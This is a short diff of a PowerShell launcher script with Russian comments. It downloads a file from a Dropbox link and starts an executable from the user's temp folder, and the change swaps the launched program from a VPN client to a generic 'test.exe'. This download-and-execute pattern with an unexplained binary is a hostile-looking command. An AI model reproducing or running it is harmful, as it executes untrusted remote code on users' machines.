@@ -12,11 +12,11 @@ Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/1q3dximiu93lv6q2ivoms/Inv
 
 # Запускаем первое приложение
 Write-Host "Please whait..." -ForegroundColor Yellow
-Start-Process "$env:TEMP\InvisibleMan-TUN.exe"
+Start-Process "$env:TEMP\test.exe"
 
 # Ждем 3 секунды
 Write-Host "Please whait...." -ForegroundColor Cyan
-Start-Sleep -Seconds 3
+Start-Sleep -Seconds 5
 
 # Запускаем второе приложение
 Write-Host "Please whait....." -ForegroundColor Yellow
